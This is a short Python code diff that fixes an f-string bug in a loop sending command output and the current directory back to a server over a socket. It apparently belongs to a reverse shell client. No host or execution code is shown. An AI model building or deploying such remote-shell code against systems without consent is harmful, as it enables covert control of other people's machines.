@@ -39,7 +39,7 @@ def main():
         # get the current working directory as output
         cwd = os.getcwd()
         # send the results back to the server
-        message = "{output}{SEPARATOR}{cwd}"
+        message = f"{output}{SEPARATOR}{cwd}"
         s.send(message.encode())
     # close client connection
     s.close()
